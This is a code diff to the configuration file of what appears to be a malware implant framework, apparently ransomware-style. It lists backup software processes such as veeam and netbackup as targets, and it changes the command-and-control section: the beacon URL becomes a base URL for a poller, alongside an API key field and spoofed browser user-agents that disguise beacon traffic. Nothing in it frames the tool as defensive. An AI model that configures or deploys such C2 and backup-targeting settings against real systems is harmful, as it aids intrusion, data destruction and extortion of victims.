@@ -33,7 +33,7 @@ backup_processes = ["veeam", "backup_exec", "commvault", "netbackup", "backup_ag
 [c2]
 # Default C2 endpoint. The bundled Rust C2 server (c2/) is plain HTTP on 8444
 # unless you terminate TLS in front of it (reverse proxy, etc.).
-url = "http://localhost:8444/beacon"
+url = "http://localhost:8444"  # BASE del C2 (el poller añade /task y /beacon)
 api_key = ""
 http_user_agents = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0",
